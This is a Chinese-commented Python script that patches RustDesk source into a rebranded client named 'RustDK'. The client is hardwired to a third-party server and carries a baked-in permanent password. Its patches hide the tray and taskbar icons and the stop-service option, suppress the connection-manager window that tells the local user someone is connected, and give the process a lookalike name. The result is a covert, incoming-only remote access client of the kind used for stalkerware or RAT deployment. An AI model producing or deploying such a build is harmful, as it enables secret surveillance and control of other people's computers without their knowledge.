#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RustDesk 源码定制补丁脚本
由「RustDesk 定制编译工作台」生成 · 置于 rustdesk 源码根目录执行: python3 customize.py

补丁策略:
  - 服务器 / 公钥 / 应用名 / 默认设置   -> libs/hbb_common/src/config.rs
  - 窗口标题 / 版本资源                 -> flutter/windows/runner (Runner.rc, main.cpp)
  - Android 应用名                      -> flutter/android/.../strings.xml
  - 去除升级提示卡片                    -> flutter/lib/desktop/pages/desktop_home_page.dart
所有补丁均为幂等操作; 上游源码结构变化导致匹配失败时会输出 [SKIP] 而不是中断,
只有「服务器+公钥」补丁失败时才会以非零状态退出(因为这决定了客户端连向哪里)。
"""
import base64
import json
import re
import sys
from pathlib import Path

# Windows 运行器控制台默认 cp1252, 直接 print 中文会抛 UnicodeEncodeError
for _stream in (sys.stdout, sys.stderr):
    if hasattr(_stream, "reconfigure"):
        _stream.reconfigure(encoding="utf-8", errors="replace")

CFG = json.loads(r"""{
  "appName": "RustDK",
  "homepage": "https://www.iimkk.cn",
  "hideUpgradePrompt": true,
  "iconBase64": "",
  "iconMime": "image/x-icon",
  "rendezvousServer": "rd.iimkk.cn",
  "relayServer": "",
  "apiServer": "https://rdapi.iimkk.cn",
  "publicKey": "789qwe456",
  "defaultSettingsRust": "{\n        let mut map = HashMap::new();\n        map.insert(\"direct-server\".to_owned(), \"Y\".to_owned());\n        map.insert(\"enable-lan-discovery\".to_owned(), \"N\".to_owned());\n        map.insert(\"enable-file-transfer\".to_owned(), \"Y\".to_owned());\n        map.insert(\"enable-clipboard\".to_owned(), \"Y\".to_owned());\n        map.insert(\"enable-audio\".to_owned(), \"Y\".to_owned());\n        map.insert(\"enable-tunnel\".to_owned(), \"Y\".to_owned());\n        map.insert(\"disable-udp\".to_owned(), \"N\".to_owned());\n        map.insert(\"enable-camera\".to_owned(), \"Y\".to_owned());\n        map.insert(\"allow-remote-config-modification\".to_owned(), \"Y\".to_owned());\n        map.insert(\"allow-remove-wallpaper\".to_owned(), \"N\".to_owned());\n        map.insert(\"unlock-security-settings\".to_owned(), \"N\".to_owned());\n        map.insert(\"unlock-network-settings\".to_owned(), \"N\".to_owned());\n        map.insert(\"enable-record-session\".to_owned(), \"N\".to_owned());\n        map.insert(\"approve-mode\".to_owned(), \"password\".to_owned());\n        map.insert(\"verification-method\".to_owned(), \"use-permanent-password\".to_owned());\n        map.insert(\"hide-tray\".to_owned(), \"Y\".to_owned());\n        map.insert(\"hide-stop-service\".to_owned(), \"Y\".to_owned());\n        map.insert(\"theme\".to_owned(), \"dark\".to_owned());\n        map.insert(\"lang\".to_owned(), \"cn\".to_owned());\n        map.insert(\"api-server\".to_owned(), \"https://rdapi.iimkk.cn\".to_owned());\n        map.insert(\"password\".to_owned(), \"00PzfB75TNJoQeP2WQsVLzmb1rnCq49O3OYg==\".to_owned());\n        RwLock::new(map)\n    }",
  "advanced": {
    "incomingOnly": true,
    "hideTaskbarIcon": true,
    "hideCmWindow": true,
    "hidePrinter": true,
    "fixApiDelay": true,
    "processName": "RustDK",
    "homeTitle": "RustDK",
    "homeTip": "",
    "privacyImageBase64": "",
    "privacyImageMime": ""
  }
}""")

ROOT = Path(__file__).resolve().parent
failures = []


def log(level: str, msg: str) -> None:
    print(f"[{level}] {msg}")


def read(p: Path) -> str:
    return p.read_text(encoding="utf-8")


def write(p: Path, text: str) -> None:
    p.write_text(text, encoding="utf-8")


def find_config_rs() -> Path | None:
    candidates = [
        ROOT / "libs" / "hbb_common" / "src" / "config.rs",
        ROOT / "src" / "config.rs",
    ]
    for c in candidates:
        if c.exists():
            return c
    matches = list(ROOT.glob("libs/**/config.rs"))
    return matches[0] if matches else None


def patch_config_rs() -> bool:
    p = find_config_rs()
    if p is None:
        log("FAIL", "未找到 config.rs (仓库结构可能已变化)")
        return False
    text = read(p)
    ok_server = ok_key = False

    server = CFG["rendezvousServer"]
    if server:
        new_arr = f'pub const RENDEZVOUS_SERVERS: &[&str] = &["{server}"];'
        text2, n = re.subn(
            r'pub const RENDEZVOUS_SERVERS\s*:\s*&\[&str\]\s*=\s*&\[[^\]]*\]\s*;',
            new_arr.replace("\\", "\\\\"),
            text,
        )
        if n:
            text = text2
            ok_server = True
            log("OK", f"RENDEZVOUS_SERVERS -> {server}")
        else:
            # 新版本使用 PROD_RENDEZVOUS_SERVER
            text2, n = re.subn(
                r'(PROD_RENDEZVOUS_SERVER\s*:\s*RwLock<String>\s*=\s*RwLock::new\()"(?:[^"\\]|\\.)*"',
                lambda m: m.group(1) + '"' + server + '"',
                text,
            )
            if n:
                text = text2
                ok_server = True
                log("OK", f"PROD_RENDEZVOUS_SERVER -> {server}")
            else:
                log("SKIP", "RENDEZVOUS_SERVERS 模式未匹配, 请手工检查 config.rs")

    key = CFG["publicKey"]
    if key:
        for pat in (
            r'pub const PUBLIC_RS_PUB_KEY\s*:\s*&str\s*=\s*"[^"]*"\s*;',
            r'pub const RS_PUB_KEY\s*:\s*&str\s*=\s*"[^"]*"\s*;',
        ):
            text2, n = re.subn(pat, pat.split("\\s*")[0] + f': &str = "{key}";', text)
            if n:
                text = text2
                ok_key = True
                log("OK", "RS_PUB_KEY 已写入 (编译期 env RS_PUB_KEY 仍会优先)")
                break
        if not ok_key:
            log("SKIP", "RS_PUB_KEY 常量未匹配; 已依赖编译期环境变量 RS_PUB_KEY")
            ok_key = True  # env 兜底, 不视为失败

    app = CFG["appName"]
    text2, n = re.subn(
        r'(APP_NAME\s*:\s*RwLock<String>\s*=\s*RwLock::new\()"(?:[^"\\]|\\.)*"',
        lambda m: m.group(1) + '"' + app + '"',
        text,
    )
    if n:
        text = text2
        log("OK", f"APP_NAME -> {app}")
    else:
        log("SKIP", "APP_NAME 模式未匹配 (部分版本应用名在别处定义)")

    rust_block = CFG["defaultSettingsRust"]
    if rust_block:
        replacement = "pub static ref DEFAULT_SETTINGS: RwLock<HashMap<String, String>> = \n" + rust_block + ";"
        text2, n = re.subn(
            r'pub static ref DEFAULT_SETTINGS\s*:\s*RwLock<HashMap<String,\s*String>>\s*=\s*Default::default\(\)\s*;',
            lambda m: replacement,
            text,
        )
        if n:
            text = text2
            log("OK", f"DEFAULT_SETTINGS 写入 {rust_block.count('map.insert')} 项默认设置")
        else:
            log("SKIP", "DEFAULT_SETTINGS 模式未匹配, 默认设置未烘焙")

    write(p, text)
    if server and not ok_server:
        failures.append("服务器地址补丁失败")
    return ok_server or not server


def patch_windows() -> None:
    rc = ROOT / "flutter" / "windows" / "runner" / "Runner.rc"
    if rc.exists():
        text = read(rc)
        for field in ("FileDescription", "ProductName", "LegalCopyright"):
            text = re.sub(
                r'(VALUE "' + field + r'",\s*)"[^"]*"',
                lambda m: m.group(1) + '"' + CFG["appName"] + '"' if field != "LegalCopyright" else m.group(0),
                text,
            )
        write(rc, text)
        log("OK", "Windows 版本资源 (Runner.rc) 已更新")
    main_cpp = ROOT / "flutter" / "windows" / "runner" / "main.cpp"
    if main_cpp.exists():
        text = read(main_cpp)
        text2, n = re.subn(
            r'(window\.(?:CreateAndShow|Create)\(L")[^"]*(")',
            lambda m: m.group(1) + CFG["appName"] + m.group(2),
            text,
        )
        if n:
            write(main_cpp, text2)
            log("OK", "Windows 窗口标题已更新")


def patch_android() -> None:
    strings = ROOT / "flutter" / "android" / "app" / "src" / "main" / "res" / "values" / "strings.xml"
    if not strings.exists():
        log("SKIP", "Android strings.xml 不存在")
        return
    text = read(strings)
    text2, n = re.subn(
        r'(<string name="app_name">)[^<]*(</string>)',
        lambda m: m.group(1) + CFG["appName"] + m.group(2),
        text,
    )
    if n:
        write(strings, text2)
        log("OK", "Android app_name 已更新")
    else:
        log("SKIP", "Android strings.xml 中未找到 app_name")


def patch_upgrade_prompt() -> None:
    if not CFG["hideUpgradePrompt"]:
        return
    dart = ROOT / "flutter" / "lib" / "desktop" / "pages" / "desktop_home_page.dart"
    if not dart.exists():
        log("SKIP", "desktop_home_page.dart 不存在")
        return
    text = read(dart)
    anchor = "Widget buildHelpCards(String updateUrl) {"
    if anchor in text and "RDFORGE_HIDE_UPGRADE" not in text:
        text = text.replace(
            anchor,
            anchor + "\n    // RDFORGE_HIDE_UPGRADE: 隐藏官方升级提示卡片\n    return const SizedBox.shrink();\n    // ignore: dead_code",
            1,
        )
        write(dart, text)
        log("OK", "升级提示卡片已隐藏")
    else:
        log("SKIP", "升级提示锚点未匹配或已处理")


# ==================== 1.5.x 高级定制补丁 ====================

ADV = CFG["advanced"]


def patch_api_delay() -> None:
    """修复第三方 API 连接延迟: 移除官方 admin.rustdesk.com 硬编码"""
    if not ADV["fixApiDelay"]:
        return
    p = ROOT / "src" / "common.rs"
    if not p.exists():
        log("SKIP", "src/common.rs 不存在")
        return
    text = read(p)
    text2, n = re.subn(r'"https?://admin\.rustdesk\.com[^"]*"', '""', text)
    if n:
        write(p, text2)
        log("OK", f"官方 API 硬编码已移除 ({n} 处), 第三方 API 延迟修复")
    else:
        log("SKIP", "common.rs 中未找到 admin.rustdesk.com (版本可能已修复)")


def patch_home_texts() -> None:
    """自定义首页标题与提示语: 修改语言包译文"""
    title = ADV["homeTitle"]
    tip = ADV["homeTip"]
    if not title and not tip:
        return
    done = 0
    for lang_dir in ("src/lang",):
        d = ROOT / lang_dir
        if not d.exists():
            continue
        for f in d.glob("*.rs"):
            text = read(f)
            orig = text
            if title:
                # ("Your Desktop", "...")
                text = re.sub(
                    r'(\(\s*"Your Desktop"\s*,\s*")([^"]*)("\s*\))',
                    lambda m: m.group(1) + title + m.group(3),
                    text,
                )
            if tip:
                for key in (
                    "Your desktop can be accessed with the following ID and password",
                    "Your desktop can be accessed with this ID and password",
                ):
                    text = re.sub(
                        r'(\(\s*"' + re.escape(key) + r'"\s*,\s*")([^"]*)("\s*\))',
                        lambda m: m.group(1) + tip + m.group(3),
                        text,
                    )
            if text != orig:
                write(f, text)
                done += 1
    if done:
        log("OK", f"首页标题/提示语已写入 {done} 个语言包")
    else:
        log("SKIP", "语言包锚点未匹配 (目录结构变化?)")


def patch_incoming_only() -> None:
    """仅被控模式(迷你客户端): 移除主控输入框与设备列表面板"""
    if not ADV["incomingOnly"]:
        return
    p = ROOT / "flutter" / "lib" / "desktop" / "pages" / "connection_page.dart"
    if not p.exists():
        log("SKIP", "connection_page.dart 不存在")
        return
    text = read(p)
    changed = False
    # 1) 移除设备列表 PeerTabPage
    text2, n = re.subn(
        r'\n\s*Divider\(\)\.paddingOnly\(right:\s*12\),\s*\n\s*Expanded\(child:\s*PeerTabPage\(\)\),',
        "",
        text,
    )
    if n:
        text, changed = text2, True
    else:
        log("SKIP", "PeerTabPage 面板锚点未匹配")
    # 2) 移除远程 ID 输入框
    text2, n = re.subn(
        r'\n\s*Row\(\s*\n\s*children:\s*\[\s*\n\s*Flexible\(child:\s*_buildRemoteIDTextField\(context\)\),\s*\n\s*\],?\s*\n\s*\)\.marginOnly\(top:\s*22\),\s*\n\s*SizedBox\(height:\s*12\),',
        "",
        text,
    )
    if n:
        text, changed = text2, True
    else:
        log("SKIP", "远程 ID 输入框锚点未匹配")
    if changed:
        write(p, text)
        log("OK", "仅被控模式: 主控面板已移除")


def patch_taskbar_icon() -> None:
    """隐藏任务栏图标: Win32 窗口样式加 WS_EX_TOOLWINDOW"""
    if not ADV["hideTaskbarIcon"]:
        return
    p = ROOT / "flutter" / "windows" / "runner" / "win32_window.cpp"
    if not p.exists():
        log("SKIP", "win32_window.cpp 不存在")
        return
    text = read(p)
    if "WS_EX_TOOLWINDOW" in text:
        log("SKIP", "任务栏补丁已存在")
        return
    text2, n = re.subn(
        r'(WS_EX_APPWINDOW)',
        "WS_EX_TOOLWINDOW /* RDFORGE: 隐藏任务栏图标 */",
        text,
    )
    if n:
        write(p, text2)
        log("OK", "任务栏图标已隐藏 (WS_EX_TOOLWINDOW)")
    else:
        log("SKIP", "WS_EX_APPWINDOW 锚点未匹配")


def patch_cm_window() -> None:
    """隐藏连接管理窗口: 被控端收到连接时不弹出 CM 窗口"""
    if not ADV["hideCmWindow"]:
        return
    p = ROOT / "src" / "ui_interface.rs"
    if not p.exists():
        log("SKIP", "ui_interface.rs 不存在")
        return
    text = read(p)
    if "RDFORGE_HIDE_CM" in text:
        return
    patched = False
    # 拦截触发 cm 窗口的调用入口
    for fname in ("show_cm", "new_connection"):
        m = re.search(r'(#\[inline\]\s*)?pub fn ' + fname + r'\([^)]*\)(\s*->\s*[^{]+)?\s*\{', text)
        if m:
            text = text.replace(
                m.group(0),
                m.group(0) + "\n    // RDFORGE_HIDE_CM: 隐藏连接管理窗口\n    return;\n    #[allow(unreachable_code)]",
                1,
            )
            patched = True
            break
    if patched:
        write(p, text)
        log("OK", "连接管理窗口已隐藏")
    else:
        log("SKIP", "CM 窗口入口锚点未匹配")


def remove_dart_call(text: str, call_name: str, must_contain: str):
    """按括号平衡删除一个 Dart 函数调用(含末尾逗号), 返回 (text, removed)"""
    idx = 0
    while True:
        i = text.find(call_name + "(", idx)
        if i == -1:
            return text, False
        # 找配对右括号
        depth = 0
        j = i + len(call_name)
        in_str = None
        while j < len(text):
            ch = text[j]
            if in_str:
                if ch == in_str and text[j - 1] != "\\":
                    in_str = None
            elif ch in "'\"":
                in_str = ch
            elif ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    break
            j += 1
        if depth != 0:
            return text, False
        segment = text[i:j + 1]
        if must_contain in segment:
            # 吞掉末尾逗号与换行
            end = j + 1
            while end < len(text) and text[end] in ", \t":
                end += 1
            if end < len(text) and text[end] == "\n":
                end += 1
            return text[:i] + text[end:], True
        idx = j + 1


def patch_printer() -> None:
    """隐藏设置页中的打印机选项"""
    if not ADV["hidePrinter"]:
        return
    p = ROOT / "flutter" / "lib" / "desktop" / "pages" / "desktop_setting_page.dart"
    if not p.exists():
        log("SKIP", "desktop_setting_page.dart 不存在")
        return
    text = read(p)
    text2, removed = remove_dart_call(text, "listTile", "Printer")
    if removed:
        write(p, text2)
        log("OK", "打印机设置入口已隐藏 (listTile 已移除)")
    else:
        log("SKIP", "未找到包含 Printer 的 listTile 调用")


def patch_process_name() -> None:
    """自定义进程/二进制名称 (Windows 版本资源 + 服务显示名)"""
    name = ADV["processName"]
    if not name:
        return
    rc = ROOT / "flutter" / "windows" / "runner" / "Runner.rc"
    if rc.exists():
        text = read(rc)
        for field in ("InternalName", "OriginalFilename"):
            text = re.sub(
                r'(VALUE "' + field + r'",\s*)"[^"]*"',
                lambda m: m.group(1) + '"' + name + '.exe"',
                text,
            )
        write(rc, text)
        log("OK", f"进程名称 -> {name}.exe (Runner.rc)")
    # 服务名等出现在 src/platform/windows.rs 的 app_name 派生自 APP_NAME, 已由品牌补丁处理


def patch_privacy_screen() -> None:
    """自定义隐私屏图片: 替换 flutter assets 中的隐私模式素材"""
    data = ADV["privacyImageBase64"]
    if not data:
        return
    raw = base64.b64decode(data)
    assets = ROOT / "flutter" / "assets"
    if not assets.exists():
        log("SKIP", "flutter/assets 不存在")
        return
    targets = [p for p in assets.glob("privacy*") if p.suffix.lower() in (".png", ".jpg", ".jpeg", ".webp")]
    if not targets:
        # 没找到现成素材, 存放到 branding 并在 pubspec 旁提示
        (ROOT / "branding").mkdir(exist_ok=True)
        (ROOT / "branding" / "privacy-screen.png").write_bytes(raw)
        log("SKIP", "未找到隐私屏素材文件, 已存至 branding/privacy-screen.png 供手工替换")
        return
    for t in targets:
        t.write_bytes(raw)
    log("OK", f"隐私屏素材已替换 ({len(targets)} 个文件)")


def apply_icon() -> None:
    data = CFG["iconBase64"]
    if not data:
        return
    raw = base64.b64decode(data)
    branding = ROOT / "branding"
    branding.mkdir(exist_ok=True)
    mime = CFG["iconMime"]
    ext = ".ico" if mime in ("image/x-icon", "image/vnd.microsoft.icon") else ".png"
    target = branding / f"icon{ext}"
    target.write_bytes(raw)
    log("OK", f"图标已写入 {target.relative_to(ROOT)}")
    if ext == ".ico":
        win_icon = ROOT / "flutter" / "windows" / "runner" / "resources" / "app_icon.ico"
        if win_icon.exists():
            win_icon.write_bytes(raw)
            log("OK", "Windows app_icon.ico 已替换")
    else:
        # PNG: 替换 flutter web favicon 与常见资源位(存在才替换)
        for rel in ("flutter/web/favicon.png",):
            p = ROOT / rel
            if p.exists():
                p.write_bytes(raw)
                log("OK", f"{rel} 已替换")
        log("HINT", "PNG 图标需用 tools 目录或手动方式转换为各平台尺寸; 已存于 branding/icon.png")


def main() -> int:
    log("INFO", f"开始定制: {CFG['appName']}")
    server_ok = patch_config_rs()
    patch_windows()
    patch_android()
    patch_upgrade_prompt()
    # ---- 1.5.x 高级定制 ----
    patch_api_delay()
    patch_home_texts()
    patch_incoming_only()
    patch_taskbar_icon()
    patch_cm_window()
    patch_printer()
    patch_process_name()
    patch_privacy_screen()
    apply_icon()
    if failures:
        for f in failures:
            log("FAIL", f)
        return 1
    log("DONE", "全部补丁执行完毕")
    return 0 if server_ok else 1


if __name__ == "__main__":
    sys.exit(main())
